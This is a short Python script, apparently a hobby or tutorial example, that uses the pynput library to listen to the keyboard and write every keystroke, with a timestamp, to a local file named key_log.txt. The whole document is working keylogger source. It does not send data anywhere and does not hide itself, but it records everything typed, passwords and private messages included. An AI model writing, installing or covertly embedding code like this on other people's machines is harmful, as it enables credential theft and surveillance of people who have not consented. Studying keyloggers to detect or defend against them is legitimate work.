from pynput.keyboard import Key, Listener
import logging

#set directory for output txt file
log_dir = ""

#basic keylogging function
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

#from library
def on_press(key):
    logging.info(str(key))

#when listener is on
with Listener(on_press=on_press) as listener:
    listener.join()